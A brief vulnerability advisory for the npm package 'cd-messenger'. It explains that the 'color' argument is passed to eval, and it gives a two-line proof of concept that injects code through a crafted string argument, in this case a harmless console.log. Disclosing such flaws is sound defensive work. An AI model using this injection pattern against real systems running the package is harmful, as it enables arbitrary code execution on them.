# Overview

`cd-messenger` is a console log logger gulp notification browser node message.

This package is vulnerable to Arbitrary Code Execution. User input provided to the `color` argument executed by the `eval` function resulting in code execution.

# Proof of Concept

```
var a = require("cd-messenger");
a.line("red(); console.log('JHU'); //")
```
